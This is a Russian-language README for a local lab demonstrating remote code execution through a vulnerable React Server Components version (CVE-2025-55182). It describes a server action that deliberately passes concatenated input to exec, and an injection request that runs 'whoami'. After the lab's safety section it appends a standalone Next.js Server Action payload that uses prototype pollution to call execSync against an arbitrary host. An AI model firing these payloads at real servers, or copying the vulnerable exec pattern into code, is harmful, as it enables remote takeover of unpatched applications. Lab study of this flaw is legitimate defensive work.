# RSC Report Lab – CVE-2025-55182 (React 19.2.0)

Учебный стенд, демонстрирующий RCE через уязвимый React Server Components (`react-server-dom-webpack` 19.2.0) и легитимный серверный gadget на `child_process.exec`.

## Стек
- Node.js 20+
- react 19.2.0
- react-dom 19.2.0
- react-server-dom-webpack 19.2.0

## Структура
- `server.js` — HTTP-сервер, вызывает уязвимый `decodeAction` из RSDW без патчей.
- `app/server-actions.js` — легитимный server action `generateReport`, который дергает `exec` со строковой конкатенацией.
- `scripts/report.js` — макет генератора отчётов (печатает аргументы).
- `package.json` — зависимости/скрипты.

## Установка
```bash
npm install
```

## Запуск
```bash
npm run start
# сервер слушает http://localhost:3002
```

## Проверка RCE (пример)
Отправить multipart POST на `/formaction`:
```
POST /formaction HTTP/1.1
Host: localhost:3002
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="$ACTION_REF_0"


------BOUNDARY
Content-Disposition: form-data; name="$ACTION_0:0"

{"id":"app/server-actions#generateReport","bound":["acme","pdf & whoami"]}
------BOUNDARY--
```
Ожидаемый ответ (Windows):
```json
{"success":true,"result":"Report generated with: --project=acme --format=pdf\ndomain\\user\r\n"}
```
`whoami` выполнился через `generateReport` → `exec`.

## Безопасность
Только для локальной лабы/dev. Не публиковать наружу. После демонстрации — обновить React/RSDW до 19.2.1+ и переписать генерацию отчётов без `exec`/конкатенации.


Payload:
```bash

POST / HTTP/1.1

Host: xxx:3000

User-Agent: Mozilla/5.0 

Next-Action: x

X-Nextjs-Request-Id: b5dce965

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad

X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9

Content-Length: 565

------WebKitFormBoundaryx8jO2oVc6SWP3Sad

Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('calc');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}

------WebKitFormBoundaryx8jO2oVc6SWP3Sad

Content-Disposition: form-data; name="1"

"$@0"

------WebKitFormBoundaryx8jO2oVc6SWP3Sad

Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--

```
